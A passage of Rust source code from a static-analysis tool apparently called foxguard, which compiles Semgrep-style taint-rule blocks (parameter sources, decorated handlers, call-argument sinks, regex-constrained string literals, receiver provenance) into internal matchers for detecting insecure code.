                    _ => eprintln!(
                        "Warning: taint rule `{}` {} `patterns:` block has a \
                         `pattern-inside:` whose value is not a non-empty string; \
                         ignoring constraint",
                        rule_id,
                        role.label()
                    ),
                }
            }
            Some("pattern-not") => {
                // Phase 2: capture the negative pattern string. It is
                // compiled to a SEARCH-mode AST pattern by the caller and
                // enforced against the matched source/sink node in the
                // post-filter, instead of being dropped (which broadened
                // the matcher and produced false positives).
                match sv.as_str() {
                    Some(p) if !p.trim().is_empty() => negatives.push(p.to_string()),
                    _ => eprintln!(
                        "Warning: taint rule `{}` {} `patterns:` block has a \
                         `pattern-not:` whose value is not a non-empty string; \
                         ignoring constraint",
                        rule_id,
                        role.label()
                    ),
                }
            }
            Some(constraint_key) if PATTERNS_CONSTRAINT_KEYS.contains(&constraint_key) => {
                // Constraint-only key — drop with a warning (documented broadening).
                eprintln!(
                    "Warning: taint rule `{}` {} `patterns:` block contains `{}` \
                     which foxguard cannot enforce inside a taint source/sink entry; \
                     dropping constraint (matcher will be broader than the original rule)",
                    rule_id,
                    role.label(),
                    constraint_key
                );
                let _ = sv; // sv is not used beyond the warning
            }
            Some(other) => {
                eprintln!(
                    "Warning: taint rule `{}` {} `patterns:` block contains unknown key `{}`; \
                     skipping sub-item",
                    rule_id,
                    role.label(),
                    other
                );
            }
            None => {}
        }
    }

    if out.len() == before {
        eprintln!(
            "Warning: taint rule `{}` {} `patterns:` block produced no expressible matchers; \
             skipping entry",
            rule_id,
            role.label()
        );
    }
}

/// Try to recognise the "parameter-as-source" shape in a `patterns:` source
/// block and, if found, push a single any-parameter wildcard source matcher.
///
/// Returns `true` (and pushes one matcher) when the block both:
///   1. names a seed metavariable `$X` — either as a `focus-metavariable: $X`
///      sub-item, or as a bare `pattern: $X` sub-item; and
///   2. contains a function-signature context (a `pattern:` or
///      `pattern-inside:` whose text declares a function/method whose
///      *parameter list* contains that same `$X`).
///
/// Discipline: we require the seed metavariable to appear *inside a parameter
/// list* of a function-definition pattern in the SAME block, so we never seed
/// "all parameters" off an unrelated metavariable. The compiled source is the
/// [`ANY_PARAM_WILDCARD`] sentinel — engines seed every function parameter as
/// tainted, matching Semgrep's any-parameter semantics for this shape.
///
/// Returns `false` (and pushes nothing) for any other block shape, leaving the
/// caller to fall through to the normal graceful-degradation extraction.
fn try_compile_param_source_block(v: &YamlValue, out: &mut Vec<GenericMatcher>) -> bool {
    let Some(items) = v.as_sequence() else {
        return false;
    };

    // Collect, across the whole block (recursing into pattern-either), the set
    // of focus/bare-pattern seed metavariables and the set of function-signature
    // pattern texts.
    let mut seeds: Vec<String> = Vec::new();
    let mut signature_texts: Vec<String> = Vec::new();
    collect_param_source_parts(items, &mut seeds, &mut signature_texts);

    if seeds.is_empty() || signature_texts.is_empty() {
        return false;
    }

    // The seed metavariable must appear as a parameter of at least one
    // function-signature context in the block.
    let matched = seeds.iter().any(|seed| {
        signature_texts
            .iter()
            .any(|sig| signature_has_param(sig, seed))
    });
    if !matched {
        return false;
    }

    out.push(GenericMatcher::ParamName {
        names: vec![crate::rules::taint_engine::ANY_PARAM_WILDCARD.to_string()],
        description: "untrusted function parameter".to_string(),
    });
    true
}

/// Try to recognise the "decorated-parameter" SOURCE shape — a parameter of a
/// function DECORATED by `@$SERVER.<METHOD>()` (the MCP `@$SERVER.tool()` rules):
///
/// ```yaml
/// patterns:
///   - pattern: |
///       @$SERVER.tool()
///       def $FUNC(..., $PARAM, ...):
///           ...
///   - focus-metavariable: $PARAM
/// ```
///
/// Recognition requires all of:
///   1. a focused/bare seed metavariable `$PARAM`;
///   2. a `pattern:` whose text is a DECORATED function definition — its first
///      line is a `@<recv>.<METHOD>(...)` decorator and a later line declares
///      `def $F(...)` whose parameter list contains the seed; and
///   3. a concrete decorator method name `<METHOD>` extracted from the `@...`
///      line (the receiver may be a metavariable; the method must be concrete).
///
/// On success pushes a single [`GenericMatcher::DecoratedParamSource`] carrying
/// that method name. Returns `false` (pushing nothing) for any other shape.
fn try_compile_decorated_param_source_block(v: &YamlValue, out: &mut Vec<GenericMatcher>) -> bool {
    let Some(items) = v.as_sequence() else {
        return false;
    };

    let mut seeds: Vec<String> = Vec::new();
    let mut signature_texts: Vec<String> = Vec::new();
    collect_param_source_parts(items, &mut seeds, &mut signature_texts);

    if seeds.is_empty() || signature_texts.is_empty() {
        return false;
    }

    // A signature must (a) declare a decorated def whose decorator yields a
    // concrete method name, and (b) list the seed inside the def's parameter
    // list (skipping the decorator's own `()`).
    for sig in &signature_texts {
        let Some(decorator) = decorator_method_from_signature(sig) else {
            continue;
        };
        let has_param = seeds.iter().any(|seed| decorated_def_has_param(sig, seed));
        if has_param {
            let description = format!("parameter of `@…{decorator}()`-decorated handler");
            out.push(GenericMatcher::DecoratedParamSource {
                decorator,
                description,
            });
            return true;
        }
    }
    false
}

/// Extract the concrete decorator method name from a decorated-def pattern's
/// leading `@<recv>.<METHOD>(...)` line. Returns `Some("tool")` for
/// `@$SERVER.tool()`, `None` when there is no `@…` decorator line or the
/// decorator has no `.<name>(` call form.
fn decorator_method_from_signature(sig: &str) -> Option<String> {
    let line = sig.lines().map(str::trim).find(|l| l.starts_with('@'))?;
    // Strip the leading `@`, then take the callee text up to the first `(`.
    let after_at = line[1..].trim_start();
    let callee = after_at.split('(').next()?.trim();
    // Require a call form: there must be a `(` after the callee.
    if !after_at.contains('(') {
        return None;
    }
    // The method name is the final dotted segment of the callee.
    let name = callee.rsplit('.').next()?.trim();
    if name.is_empty() || !name.chars().all(is_ident_char) {
        return None;
    }
    Some(name.to_string())
}

/// True when the decorated-def pattern `sig` lists `seed` in the parameter list
/// of its `def`/`function`/`fun` line — the parameter list that FOLLOWS the
/// decorator line, so the decorator's own `()` is not mistaken for the params.
fn decorated_def_has_param(sig: &str, seed: &str) -> bool {
    // Find the def line (the one introducing the parameter list). We reuse
    // `signature_has_param` but anchored on the substring starting at the `def `
    // (or other def keyword) so the decorator's parentheses are skipped.
    let def_pos = ["def ", "function", "func ", "fun "]
        .iter()
        .filter_map(|kw| sig.find(kw))
        .min();
    let scan_from = def_pos.unwrap_or(0);
    signature_has_param(&sig[scan_from..], seed)
}

/// Try to recognise the "string-literal-matching-regex" SOURCE shape in a
/// `patterns:` source block and, if found, push a
/// [`GenericMatcher::LiteralString`] whose `regex` restricts seeding to literals
/// whose text matches the constraint.
///
/// The recognised shape pairs a string-literal metavariable pattern with a
/// `metavariable-pattern` (or `metavariable-regex`) that regex-constrains that
/// same metavariable's content:
///
/// ```yaml
/// patterns:
///   - pattern: |
///       "$URL"
///   - metavariable-pattern:
///       metavariable: $URL
///       language: regex
///       patterns:
///         - pattern-regex: http://
///         - pattern-not-regex: .*://localhost
///         - pattern-not-regex: .*://127\.0\.0\.1
/// ```
///
/// The positive `pattern-regex` clauses and negative `pattern-not-regex` clauses
/// are combined into ONE lookahead regex `^(?=[\s\S]*(?:POS))...(?![\s\S]*(?:NEG))...`
/// (each clause keeps Semgrep's "match anywhere in the value" semantics). The
/// combined regex is validated with [`crate::rules::semgrep_compat::compile_regex`];
/// if it fails to compile the block is left unrecognised (the caller falls
/// through to graceful degradation). Returns `true` (pushing one matcher) on
/// recognition.
fn try_compile_string_literal_regex_source_block(
    v: &YamlValue,
    rule_id: &str,
    out: &mut Vec<GenericMatcher>,
) -> bool {
    let Some(items) = v.as_sequence() else {
        return false;
    };

    let mut literal_metavar: Option<String> = None;
    let mut constraint: Option<(String, Vec<String>, Vec<String>)> = None;

    for item in items {
        let Some(map) = item.as_mapping() else {
            continue;
        };
        for (k, val) in map {
            match k.as_str() {
                Some("pattern") => {
                    if let Some(s) = val.as_str() {
                        if let Some(mv) = quoted_single_metavar(s) {
                            literal_metavar = Some(mv);
                        }
                    }
                }
                Some("metavariable-pattern") | Some("metavariable-regex") => {
                    if let Some(m) = val.as_mapping() {
                        let mv = m
                            .get(YamlValue::from("metavariable"))
                            .and_then(YamlValue::as_str);
                        // `metavariable-regex` carries a single inline `regex:`;
                        // `metavariable-pattern` (language: regex) carries a
                        // nested `patterns:` / `pattern-regex:` set. Collect both.
                        let mut positives: Vec<String> = Vec::new();
                        let mut negatives: Vec<String> = Vec::new();
                        if let Some(re) =
                            m.get(YamlValue::from("regex")).and_then(YamlValue::as_str)
                        {
                            positives.push(re.to_string());
                        }
                        collect_regex_constraints(val, &mut positives, &mut negatives);
                        if let Some(mv) = mv {
                            if !positives.is_empty() {
                                constraint = Some((mv.to_string(), positives, negatives));
                            }
                        }
                    }
                }
                _ => {}
            }
        }
    }

    let (Some(lit_mv), Some((c_mv, positives, negatives))) = (literal_metavar, constraint) else {
        return false;
    };
    // The regex constraint must target the SAME metavariable the literal binds.
    if lit_mv != c_mv {
        return false;
    }

    // Build one combined lookahead regex: every positive must be present and no
    // negative may be present, each searched anywhere in the literal's text.
    let mut combined = String::from("^");
    for p in &positives {
        combined.push_str(&format!("(?=[\\s\\S]*(?:{p}))"));
    }
    for n in &negatives {
        combined.push_str(&format!("(?![\\s\\S]*(?:{n}))"));
    }

    // Validate the combined regex compiles (fancy-regex handles the lookaheads).
    if let Err(e) = crate::rules::semgrep_compat::compile_regex(&combined) {
        eprintln!(
            "Warning: taint rule `{rule_id}` string-literal-regex source did not compile ({e}); skipping entry"
        );
        return false;
    }

    out.push(GenericMatcher::LiteralString {
        description: "string literal matching regex".to_string(),
        regex: Some(combined),
    });
    true
}

/// If `pat` is a quoted string literal whose entire content is a single
/// metavariable (`"$URL"` / `'$URL'`, possibly with a `pattern: |` trailing
/// newline), return that metavariable (`$URL`). Any other shape returns `None`.
fn quoted_single_metavar(pat: &str) -> Option<String> {
    let t = pat.trim();
    let bytes = t.as_bytes();
    if bytes.len() < 3 {
        return None;
    }
    let quote = bytes[0];
    if (quote != b'"' && quote != b'\'') || bytes[bytes.len() - 1] != quote {
        return None;
    }
    let inner = t[1..t.len() - 1].trim();
    if is_metavariable(inner) {
        Some(inner.to_string())
    } else {
        None
    }
}

/// Recursively collect `pattern-regex:` (positive) and `pattern-not-regex:`
/// (negative) clause strings from a `metavariable-pattern` value (walking its
/// nested `patterns:` / `pattern-either:` lists).
fn collect_regex_constraints(
    node: &YamlValue,
    positives: &mut Vec<String>,
    negatives: &mut Vec<String>,
) {
    match node {
        YamlValue::Mapping(map) => {
            for (k, v) in map {
                match k.as_str() {
                    Some("pattern-regex") => {
                        if let Some(s) = v.as_str() {
                            positives.push(s.trim().to_string());
                        }
                    }
                    Some("pattern-not-regex") => {
                        if let Some(s) = v.as_str() {
                            negatives.push(s.trim().to_string());
                        }
                    }
                    _ => collect_regex_constraints(v, positives, negatives),
                }
            }
        }
        YamlValue::Sequence(seq) => {
            for item in seq {
                collect_regex_constraints(item, positives, negatives);
            }
        }
        _ => {}
    }
}

/// Walk a `patterns:` block (and nested `pattern-either:` lists) collecting
/// seed metavariables (`focus-metavariable: $X` and bare `pattern: $X`) and the
/// text of function-signature contexts (`pattern:` / `pattern-inside:` whose
/// value is a multi-line function definition).
fn collect_param_source_parts(
    items: &[YamlValue],
    seeds: &mut Vec<String>,
    signature_texts: &mut Vec<String>,
) {
    for item in items {
        let Some(map) = item.as_mapping() else {
            continue;
        };
        for (k, val) in map {
            match k.as_str() {
                Some("focus-metavariable") => {
                    if let Some(s) = val.as_str() {
                        let mv = s.trim();
                        if is_metavariable(mv) {
                            seeds.push(mv.to_string());
                        }
                    }
                }
                Some("pattern") => {
                    if let Some(s) = val.as_str() {
                        let t = s.trim();
                        if is_metavariable(t) {
                            seeds.push(t.to_string());
                        } else if is_function_definition_pattern(t) {
                            signature_texts.push(t.to_string());
                        }
                    }
                }
                Some("pattern-inside") => {
                    if let Some(s) = val.as_str() {
                        if is_function_definition_pattern(s) {
                            signature_texts.push(s.to_string());
                        }
                    }
                }
                Some("pattern-either") => {
                    if let Some(seq) = val.as_sequence() {
                        collect_param_source_parts(seq, seeds, signature_texts);
                    }
                }
                Some("patterns") => {
                    if let Some(seq) = val.as_sequence() {
                        collect_param_source_parts(seq, seeds, signature_texts);
                    }
                }
                _ => {}
            }
        }
    }
}

/// True when `pat` looks like a function/method definition pattern: it declares
/// a function with a parameter list. We accept the common cross-language
/// keywords plus the assignment-to-function form (`exports.handler = function
/// (...)`, `$F = function (...)`), requiring a `(` ... `)` parameter list.
fn is_function_definition_pattern(pat: &str) -> bool {
    let p = pat.trim();
    if !(p.contains('(') && p.contains(')')) {
        return false;
    }
    // A leading definition keyword anywhere in the (possibly multi-line) pattern.
    p.contains("function")                       // JS/TS/PHP
        || p.contains("func ")                   // Go
        || p.starts_with("def ")
        || p.contains("\ndef ")                  // Python/Ruby/Scala
        || p.contains("fun ")                    // Kotlin
        || p.contains("=>")                      // arrow / lambda
        // A Java/C-style typed method signature: `$T $M(...) { ... }` — a
        // metavariable or identifier return type followed by a name and a
        // parameter list and a brace body.
        || (p.contains('{') && p.contains('$'))
}

/// True when the function-signature pattern `sig` lists `seed` (a metavariable
/// like `$ARG`) inside its FIRST parameter list `( ... )`. This bounds the
/// any-parameter seed to a metavariable that is genuinely a parameter, so we
/// never seed off an unrelated metavariable elsewhere in the pattern.
fn signature_has_param(sig: &str, seed: &str) -> bool {
    let Some(open) = sig.find('(') else {
        return false;
    };
    // Find the matching close paren for this first '(' (balanced).
    let bytes = sig.as_bytes();
    let mut depth = 0i32;
    let mut close = None;
    for (i, &b) in bytes.iter().enumerate().skip(open) {
        match b {
            b'(' => depth += 1,
            b')' => {
                depth -= 1;
                if depth == 0 {
                    close = Some(i);
                    break;
                }
            }
            _ => {}
        }
    }
    let Some(close) = close else {
        return false;
    };
    let params = &sig[open + 1..close];
    // Token-boundary match so `$ARG` does not match `$ARGUMENT`.
    params
        .split(|c: char| !is_ident_char(c) && c != '$')
        .any(|tok| tok == seed)
}

/// Try to recognise the "focus-on-call-argument" SINK shape in a `patterns:`
/// sink/sanitizer block and, if found, push the call's `Call`/`MethodName`
/// matcher(s). Returns `true` (and pushes ≥1 matcher) on recognition.
///
/// Recognition is the sink-side analog of [`try_compile_param_source_block`]:
///   1. the block names a focused metavariable `$F` — via `focus-metavariable:
///      $F` or a bare `pattern: $F`; and
///   2. the block carries a CALL context (a `pattern:` or `pattern-inside:`
///      whose text is a call) whose ARGUMENT LIST contains that `$F` (literally,
///      or via a `...`/metavariable wildcard arg list — "an argument of the
///      call").
///
/// The call's callee is compiled to a sink matcher:
///   - a concrete callee (`redirect_to(...)`, `render(...)`) → one `Call`;
///   - a `$RECV.$METH(...)` callee whose `$METH` is pinned by an anchored
///     alternation `metavariable-regex` (`^(sendfile|sendFile)$`) → one
///     `MethodName` per listed method name;
///   - a `$FUNC(...)` pure-metavariable callee whose `$FUNC` is pinned by an
///     anchored-alternation `metavariable-regex` → one `Call` per listed name.
///
/// These reuse the existing `Call`/`MethodName` sink machinery, which only
/// fires when a tracked-tainted value reaches the call's arguments — so the
/// compiled sink is gated on taint AND the concrete callee/method name, keeping
/// it from being an over-broad bare-node sink. Any callee that does not resolve
/// to a concrete name (no regex pin, metavariable left free) produces nothing,
/// so the caller falls through to the normal graceful-degradation extraction.
fn try_compile_focus_call_sink_block(
    v: &YamlValue,
    role: MatcherRole,
    lang: Language,
    out: &mut Vec<GenericMatcher>,
) -> bool {
    let Some(items) = v.as_sequence() else {
        return false;
    };

    let mut seeds: Vec<String> = Vec::new();
    let mut call_texts: Vec<String> = Vec::new();
    let mut metavar_regexes: Vec<(String, String)> = Vec::new();
    collect_focus_call_sink_parts(items, &mut seeds, &mut call_texts, &mut metavar_regexes);

    if seeds.is_empty() || call_texts.is_empty() {
        return false;
    }

    let before = out.len();
    for call in &call_texts {
        // The focused metavariable must be an argument of this call.
        if !seeds.iter().any(|seed| call_has_arg(call, seed)) {
            continue;
        }
        compile_focus_call_callee(call, role, lang, &metavar_regexes, out);
    }
    out.len() > before
}

/// Try to recognise the "focus-on-call-argument" SOURCE shape — the
/// source-side dual of [`try_compile_focus_call_sink_block`] — and, if found,
/// push one [`GenericMatcher::CallArgSource`] per matching call/seed pairing.
/// Returns `true` (and pushes ≥1 matcher) on recognition.
///
/// The shape (the C# `use_weak_rng_for_keygeneration` rule):
///
/// ```yaml
/// pattern-sources:
///   - patterns:
///       - pattern-inside: (System.Random $RNG).NextBytes($KEY); ...
///       - pattern: $KEY
/// ```
///
/// Recognition:
///   1. the block names a focused metavariable `$KEY` — via `focus-metavariable:
///      $KEY` or a bare `pattern: $KEY`; and
///   2. the block carries a CALL context (a `pattern-inside:`/`pattern:` whose
///      text is a call, possibly with a leading typed-receiver cast
///      `(System.Random $RNG).` and a trailing `; ...` Semgrep continuation)
///      whose ARGUMENT LIST holds that `$KEY` at a definite position.
///
/// The call's final method name (`NextBytes`) and the zero-based argument
/// position of the focused metavariable (`0`) are compiled to a
/// [`GenericMatcher::CallArgSource`]. The C# engine seeds the identifier sitting
/// in that argument position of any matching call as tainted, so `NextBytes(key)`
/// makes `key` an untrusted-key-material source. Source role only — a call
/// argument fill is a taint origin, not a destination. When no call/seed pairing
/// resolves to a definite `(method, arg_index)` the recognizer claims nothing and
/// the caller falls through to the normal graceful-degradation extraction.
fn try_compile_focus_call_source_block(v: &YamlValue, out: &mut Vec<GenericMatcher>) -> bool {
    let Some(items) = v.as_sequence() else {
        return false;
    };

    let mut seeds: Vec<String> = Vec::new();
    let mut call_texts: Vec<String> = Vec::new();
    collect_focus_call_source_parts(items, &mut seeds, &mut call_texts);

    if seeds.is_empty() || call_texts.is_empty() {
        return false;
    }

    let before = out.len();
    for call in &call_texts {
        for seed in &seeds {
            if let Some((method, arg_index)) = parse_call_arg_source(call, seed) {
                let candidate = GenericMatcher::CallArgSource {
                    method: method.clone(),
                    arg_index,
                    description: format!("value filled into `{method}(...)` argument (source)"),
                };
                // Avoid duplicate matchers when several seeds/call texts resolve
                // to the same (method, arg_index).
                let dup = out.iter().any(|m| {
                    matches!(m, GenericMatcher::CallArgSource { method: mm, arg_index: ai, .. }
                        if *mm == method && *ai == arg_index)
                });
                if !dup {
                    out.push(candidate);
                }
            }
        }
    }
    out.len() > before
}

/// Walk a SOURCE `patterns:` block (recursing into `pattern-either:`/`patterns:`)
/// collecting focused metavariables (`focus-metavariable: $F` and bare
/// `pattern: $F`) and the raw text of any `pattern:`/`pattern-inside:` call
/// context (a non-metavariable pattern string). The context text is validated
/// later by [`parse_call_arg_source`], which returns `None` for anything that is
/// not a call whose argument list contains the seed — so over-collecting here is
/// harmless.
fn collect_focus_call_source_parts(
    items: &[YamlValue],
    seeds: &mut Vec<String>,
    call_texts: &mut Vec<String>,
) {
    for item in items {
        let Some(map) = item.as_mapping() else {
            continue;
        };
        for (k, val) in map {
            match k.as_str() {
                Some("focus-metavariable") => {
                    if let Some(s) = val.as_str() {
                        let mv = s.trim();
                        if is_metavariable(mv) {
                            seeds.push(mv.to_string());
                        }
                    }
                }
                Some("pattern") => {
                    if let Some(s) = val.as_str() {
                        let t = s.trim();
                        if is_metavariable(t) {
                            seeds.push(t.to_string());
                        } else {
                            call_texts.push(t.to_string());
                        }
                    }
                }
                Some("pattern-inside") => {
                    if let Some(s) = val.as_str() {
                        call_texts.push(s.trim().to_string());
                    }
                }
                Some("pattern-either") | Some("patterns") => {
                    if let Some(seq) = val.as_sequence() {
                        collect_focus_call_source_parts(seq, seeds, call_texts);
                    }
                }
                _ => {}
            }
        }
    }
}

/// Parse a focus-on-call-argument SOURCE call context, returning the call's
/// final method-name segment and the zero-based argument position of `seed`.
///
/// Handles a leading Semgrep typed-receiver cast `(System.Random $RNG).` (drops
/// it to a bare `$RNG.` receiver), a trailing `; ...` Semgrep continuation, and
/// a dotted or bare callee. Returns `None` when `call` is not a single call, when
/// its callee has no plain-identifier final method segment, or when `seed` is not
/// exactly one of the call's top-level arguments — so faithfulness is preserved
/// (only a genuine focused argument of a genuine call yields a seed target).
fn parse_call_arg_source(call: &str, seed: &str) -> Option<(String, usize)> {
    let c = call.trim();
    // Strip a leading typed-receiver cast `(System.Random $RNG).NextBytes(...)`
    // to a bare `$RNG.NextBytes(...)` receiver so the callee reads as an ordinary
    // dotted call. A bare `(Type $MV)` with no trailing chain is left alone.
    let normalized;
    let b = if c.starts_with('(') {
        match parse_typed_metavar(c) {
            Some((_, metavar, remainder)) if !remainder.trim().is_empty() => {
                normalized = format!("{metavar}{remainder}");
                normalized.as_str()
            }
            _ => c,
        }
    } else {
        c
    };
    let b = b.trim();

    let open = b.find('(')?;
    let callee = b[..open].trim();
    if callee.is_empty() {
        return None;
    }
    // The callee must be a plain or dotted identifier chain (no operators / call
    // parens in the receiver). The final `.`-segment is the method name.
    let method = callee.rsplit('.').next()?.trim();
    if !is_identifier(method) {
        return None;
    }
    // Reject a receiver that carries call/operator punctuation (an expression,
    // not a plain `recv.method` callee).
    if callee.contains('(')
        || callee.contains('=')
        || callee.contains('+')
        || callee.contains('%')
        || callee.contains('[')
    {
        return None;
    }

    // Locate the balanced argument list opened by this first `(`.
    let bytes = b.as_bytes();
    let mut depth = 0i32;
    let mut close = None;
    for (i, &ch) in bytes.iter().enumerate().skip(open) {
        match ch {
            b'(' => depth += 1,
            b')' => {
                depth -= 1;
                if depth == 0 {
                    close = Some(i);
                    break;
                }
            }
            _ => {}
        }
    }
    let close = close?;
    let args = &b[open + 1..close];

    // Split the argument list at TOP-LEVEL commas and find the position whose
    // trimmed text is exactly the focused metavariable.
    for (idx, piece) in split_top_level_commas(args).iter().enumerate() {
        if piece.trim() == seed {
            return Some((method.to_string(), idx));
        }
    }
    None
}

/// Split `s` at commas that are not nested inside `()`, `[]`, or `{}`. Returns
/// the raw (un-trimmed) pieces in order; an empty input yields a single empty
/// piece (a zero-argument call has no focused position, handled by the caller).
fn split_top_level_commas(s: &str) -> Vec<&str> {
    let mut pieces = Vec::new();
    let mut depth = 0i32;
    let mut start = 0usize;
    for (i, ch) in s.char_indices() {
        match ch {
            '(' | '[' | '{' => depth += 1,
            ')' | ']' | '}' => depth -= 1,
            ',' if depth == 0 => {
                pieces.push(&s[start..i]);
                start = i + 1;
            }
            _ => {}
        }
    }
    pieces.push(&s[start..]);
    pieces
}

/// Try to recognise the positional-`focus-metavariable` SINK shape and, if
/// found, push one [`GenericMatcher::MethodArgSink`] per focused argument
/// position. Returns `true` on recognition.
///
/// The shape (the `tainted-session-from-http-request` sink):
///
/// ```yaml
/// patterns:
///   - pattern: (HttpServletRequest $REQ).getSession().$FUNC($NAME, $VALUE);
///   - metavariable-regex: { metavariable: $FUNC, regex: ^(putValue|setAttribute)$ }
///   - focus-metavariable: $VALUE
/// ```
///
/// Recognition (deliberately narrow so it never claims an ordinary any-argument
/// focus sink): the outer call's method must be a METAVARIABLE pinned by an
/// anchored alternation of concrete names (`$FUNC` → `putValue`/`setAttribute`),
/// the call must have ≥2 top-level arguments, and the `focus-metavariable` must
/// name one of those argument positions. The compiled sink fires only when the
/// argument at that position carries taint — strictly narrower than the
/// any-argument `MethodName` the dropped-constraint fallback would produce.
///
/// Returns `false` (claiming nothing) for any other shape, leaving the caller to
/// fall through to the ordinary focus-call / graceful-degradation extraction.
fn try_compile_method_arg_sink_block(
    v: &YamlValue,
    role: MatcherRole,
    out: &mut Vec<GenericMatcher>,
) -> bool {
    let Some(items) = v.as_sequence() else {
        return false;
    };
    let mut patterns: Vec<String> = Vec::new();
    let mut focus: Vec<String> = Vec::new();
    let mut pins: Vec<(String, String)> = Vec::new();
    collect_method_arg_sink_parts(items, &mut patterns, &mut focus, &mut pins);

    if patterns.is_empty() || focus.is_empty() {
        return false;
    }

    let before = out.len();
    for pat in &patterns {
        let Some((method_seg, args)) = parse_outer_call(pat) else {
            continue;
        };
        // The method must be a metavariable pinned to concrete names; a
        // concrete-method focus sink is handled by the any-argument recognizer.
        if !is_metavariable(&method_seg) {
            continue;
        }
        let Some(methods) = regex_alternatives_for(&method_seg, &pins) else {
            continue;
        };
        // Require a genuinely positional argument list (≥2 args).
        if args.len() < 2 {
            continue;
        }
        for f in &focus {
            if let Some(idx) = args.iter().position(|a| a.trim() == f.as_str()) {
                let desc = format!("tainted argument #{idx} into `{}(...)`", methods.join("|"));
                out.push(GenericMatcher::MethodArgSink {
                    methods: methods.clone(),
                    arg_index: idx,
                    description: describe(&desc, role),
                });
            }
        }
    }
    out.len() > before
}

/// Walk a sink `patterns:` block (recursing into `pattern-either:`/`patterns:`)
/// collecting non-metavariable `pattern:` call texts, `focus-metavariable`
/// names, and `metavariable-regex` (metavariable, regex) pins for the
/// positional-argument sink recogniser.
fn collect_method_arg_sink_parts(
    items: &[YamlValue],
    patterns: &mut Vec<String>,
    focus: &mut Vec<String>,
    pins: &mut Vec<(String, String)>,
) {
    for item in items {
        let Some(map) = item.as_mapping() else {
            continue;
        };
        for (k, val) in map {
            match k.as_str() {
                Some("focus-metavariable") => {
                    if let Some(s) = val.as_str() {
                        let mv = s.trim();
                        if is_metavariable(mv) {
                            focus.push(mv.to_string());
                        }
                    }
                }
                Some("pattern") => {
                    if let Some(s) = val.as_str() {
                        let t = s.trim();
                        if !is_metavariable(t) {
                            patterns.push(t.to_string());
                        }
                    }
                }
                Some("metavariable-regex") => {
                    if let Some(mm) = val.as_mapping() {
                        let mv = mm
                            .get(YamlValue::from("metavariable"))
                            .and_then(|x| x.as_str());
                        let re = mm.get(YamlValue::from("regex")).and_then(|x| x.as_str());
                        if let (Some(mv), Some(re)) = (mv, re) {
                            pins.push((mv.to_string(), re.to_string()));
                        }
                    }
                }
                Some("pattern-either") | Some("patterns") => {
                    if let Some(seq) = val.as_sequence() {
                        collect_method_arg_sink_parts(seq, patterns, focus, pins);
                    }
                }
                _ => {}
            }
        }
    }
}

/// Parse the OUTERMOST call of `pat`, returning its final method-name segment
/// and its top-level (trimmed) argument texts. Handles a nested-receiver chain
/// with its own parens (`(Type $R).getSession().$FUNC($A, $B)`): the argument
/// list is the balanced group closing at the pattern's final `)`, and the method
/// segment is the last `.`-separated token of the callee. Returns `None` when
/// `pat` is not a call ending in `)`.
fn parse_outer_call(pat: &str) -> Option<(String, Vec<String>)> {
    let c = pat.trim().trim_end_matches(';').trim();
    if !c.ends_with(')') {
        return None;
    }
    let bytes = c.as_bytes();
    let mut depth = 0i32;
    let mut open = None;
    for i in (0..bytes.len()).rev() {
        match bytes[i] {
            b')' => depth += 1,
            b'(' => {
                depth -= 1;
                if depth == 0 {
                    open = Some(i);
                    break;
                }
            }
            _ => {}
        }
    }
    let open = open?;
    let callee = c[..open].trim();
    let method = callee.rsplit('.').next()?.trim();
    if method.is_empty() {
        return None;
    }
    let args_str = &c[open + 1..c.len() - 1];
    let args: Vec<String> = split_top_level_commas(args_str)
        .iter()
        .map(|s| s.trim().to_string())
        .collect();
    Some((method.to_string(), args))
}

/// Try to recognise the receiver-provenance SOURCE shape and, if found, push one
/// [`GenericMatcher::ReceiverProvenanceCall`]. Returns `true` on recognition.
///
/// The shape (the `md5-used-as-password` source):
///
/// ```yaml
/// patterns:
///   - pattern-inside: |
///       $TYPE $MD = MessageDigest.getInstance("MD5");
///       ...
///   - pattern: $MD.digest(...)
/// ```
///
/// Recognition: a `pattern-inside` declaring a metavariable `$MD` initialized by
/// a call `init_receiver.init_method("literal")`, paired with a `pattern:`
/// `$MD.method(...)` whose receiver is that SAME metavariable. The compiled
/// source fires on the `.method(...)` call only when the receiver's in-scope
/// initializer matches — the string literal (`"MD5"`) is the discriminator.
///
/// Returns `false` (claiming nothing) for any other shape.
fn try_compile_receiver_provenance_source_block(
    v: &YamlValue,
    out: &mut Vec<GenericMatcher>,
) -> bool {
    let Some(items) = v.as_sequence() else {
        return false;
    };
    let mut insides: Vec<String> = Vec::new();
    let mut patterns: Vec<String> = Vec::new();
    collect_provenance_parts(items, &mut insides, &mut patterns);

    for inside in &insides {
        let Some((var, init)) = parse_decl_init(inside) else {
            continue;
        };
        let Some((init_receiver, init_method, init_arg)) = parse_init_call(&init) else {
            continue;
        };
        for pat in &patterns {
            let Some((recv_mv, method)) = parse_receiver_method_call(pat) else {
                continue;
            };
            if recv_mv != var {
                continue;
            }
            out.push(GenericMatcher::ReceiverProvenanceCall {
                description: format!(
                    "`.{method}()` on a `{init_receiver}.{init_method}(\"{init_arg}\")` value"
                ),
                init_receiver,
                init_method,
                init_arg,
                method,
            });
            return true;
        }
    }
    false
}

/// Walk a source `patterns:` block collecting `pattern-inside:` texts and
/// non-metavariable `pattern:` texts for the receiver-provenance recogniser.
fn collect_provenance_parts(
    items: &[YamlValue],
    insides: &mut Vec<String>,
    patterns: &mut Vec<String>,
) {
    for item in items {
        let Some(map) = item.as_mapping() else {
            continue;
        };
        for (k, val) in map {
            match k.as_str() {
                Some("pattern-inside") => {
                    if let Some(s) = val.as_str() {
                        insides.push(s.to_string());
                    }
                }
                Some("pattern") => {
                    if let Some(s) = val.as_str() {
                        let t = s.trim();
                        if !is_metavariable(t) {
                            patterns.push(t.to_string());
                        }
                    }
                }
                Some("pattern-either") | Some("patterns") => {
                    if let Some(seq) = val.as_sequence() {
                        collect_provenance_parts(seq, insides, patterns);
                    }
                }
                _ => {}
            }
        }
    }
}

/// Parse a `pattern-inside` declaration `$TYPE $MD = <init>;` (possibly followed
/// by a `...` continuation on later lines), returning the declared metavariable
/// `$MD` and the initializer text `<init>`. Requires a declaration LHS of at
/// least two whitespace tokens whose last is a metavariable, and a single `=`
/// (not `==`). Returns `None` otherwise.
fn parse_decl_init(text: &str) -> Option<(String, String)> {
    let line = text.lines().map(str::trim).find(|l| !l.is_empty())?;
    // Locate the first `=` that is not part of `==`/`>=`/`<=`/`!=`.
    let bytes = line.as_bytes();
    let mut eq = None;
    for i in 0..bytes.len() {
        if bytes[i] == b'=' {
            let prev = if i > 0 { bytes[i - 1] } else { b' ' };
